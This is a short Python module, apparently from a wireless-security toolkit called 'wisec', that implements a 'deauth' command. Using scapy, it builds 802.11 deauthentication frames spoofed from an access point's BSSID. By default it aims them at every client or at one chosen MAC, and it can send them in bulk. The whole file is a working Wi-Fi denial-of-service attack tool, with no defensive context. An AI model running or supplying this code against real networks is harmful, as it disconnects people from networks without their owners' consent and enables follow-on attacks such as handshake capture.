#!/usr/bin/env python3

import argparse
from cmd2 import argparse_completer
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
from scapy.all import sendp
from progress.bar import Bar
from wisec import router, arp


def packet(bssid, client=None):
    '''Create dauth packet targeting client connected to bssid.
    If client is None (default), will target all clients.'''

    if client is None or client == 'all':
        client = 'FF:FF:FF:FF:FF:FF'

    p = RadioTap() /\
        Dot11(type=0, subtype=12, addr1=client, addr2=bssid, addr3=bssid) /\
        Dot11Deauth(reason=7)

    return p


parser = argparse.ArgumentParser(prog='deauth')
bssid = parser.add_argument('bssid')
setattr(bssid, argparse_completer.ACTION_ARG_CHOICES, router.get_bssids)
mac = parser.add_argument('target', nargs='?', default=None)
setattr(mac, argparse_completer.ACTION_ARG_CHOICES, arp.get_hosts)
parser.add_argument('-c', dest='count', type=int, default=1)


def handler(args):
    bssid = router.to_mac(args.bssid)
    mac = arp.to_mac(args.target)

    pac = packet(bssid, mac)
    if args.count != 1:
        for _ in Bar().iter(range(args.count)):
            sendp(pac)
    else:
        sendp(pac)
